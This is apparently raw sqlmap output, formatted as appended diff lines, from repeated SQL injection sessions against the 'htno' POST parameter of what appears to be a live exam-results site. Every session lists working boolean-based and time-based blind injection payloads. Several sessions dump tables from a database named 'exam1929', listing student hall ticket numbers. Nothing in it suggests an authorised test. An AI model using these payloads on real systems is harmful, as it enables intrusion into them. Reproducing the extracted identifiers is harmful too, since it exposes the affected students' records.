+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+Database: exam1929
+Table: marks_be_31_main_2024
+[1 entry]
++--------------+
+| htno         |
++--------------+
+| 100518732062 |
++--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+Database: exam1929
+Table: marks_be_31_main_2025
+[1 entry]
++--------------+
+| htno         |
++--------------+
+| 100519733035 |
++--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+Database: exam1929
+Table: marks_be_31_main_2025_hon_min
+[1 entry]
++--------------+
+| htno         |
++--------------+
+| 100522729011 |
++--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+Database: exam1929
+Table: marks_be_32_may2021_main
+[3 entries]
++--------------+
+| htno         |
++--------------+
+| 100516732082 |
+| 100516732082 |
+| 100516732082 |
++--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+Database: exam1929
+Table: marks_be_11_main_2025
+[39 entries]
++--------------+
+| htno         |
++--------------+
+| 100518732062 |
+| 100520732031 |
+| 100521730001 |
+| 100521730001 |
+| 100521730001 |
+| 100521730006 |
+| 100521730006 |
+| 100521730008 |
+| 100521730008 |
+| 100521730015 |
+| 100521730015 |
+| 100521730015 |
+| 100521730023 |
+| 100521730023 |
+| 100521730024 |
+| 100521730024 |
+| 100521730030 |
+| 100521730030 |
+| 100521730030 |
+| 100521730031 |
+| 100521730036 |
+| 100521730043 |
+| 100521730043 |
+| 100521730043 |
+| 100521730044 |
+| 100521730044 |
+| 100521730046 |
+| 100521731002 |
+| 100521731002 |
+| 100521731002 |
+| 100521732013 |
+| 100521732025 |
+| 100521732025 |
+| 100521732041 |
+| 100521733067 |
+| 100521734062 |
+| 100521734068 |
+| 100521734068 |
+| 100521736021 |
++--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
